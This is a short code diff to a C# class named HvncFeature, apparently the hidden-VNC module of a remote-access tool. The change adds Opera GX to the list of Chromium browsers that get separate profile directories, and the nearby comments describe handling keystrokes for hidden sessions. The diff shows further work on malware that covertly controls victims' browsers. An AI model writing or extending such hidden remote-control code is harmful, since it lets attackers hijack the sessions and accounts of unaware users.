@@ -314,7 +314,7 @@ internal static class HvncFeature
 
     // Chromium-based browsers share a profile lock — give each HVNC instance its own data dir.
     private static readonly HashSet<string> _chromiumBrowsers = new(StringComparer.OrdinalIgnoreCase)
-        { "chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe", "chromium.exe" };
+        { "chrome.exe", "msedge.exe", "opera.exe", "operagx.exe", "brave.exe", "vivaldi.exe", "chromium.exe" };
 
     // Modifier key state — tracked by HandleKey, used by VkToChars
     private static bool _shiftDown, _ctrlDown, _altDown, _capsLock;
